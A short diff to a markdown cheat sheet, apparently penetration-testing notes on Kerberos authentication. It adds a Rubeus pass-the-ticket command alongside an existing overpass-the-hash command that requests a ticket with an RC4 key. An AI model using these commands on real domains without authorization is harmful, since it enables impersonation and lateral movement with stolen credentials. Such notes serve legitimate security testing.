@@ -30,6 +30,14 @@ The same is possible with an RC4 key. This is the same as authenticating with a 
 > Rubeus.exe asktgt /user:<username> /rc4:<key> /opsec /domain:<domain> /ptt /force
 ```
 
+### Authenticate with a ticket
+
+If you have a ticket, inject it with:
+
+```powershell
+> Rubeus.exe ptt /ticket:<ticket>
+```
+
 ## NTLM authentication
 
 XXX
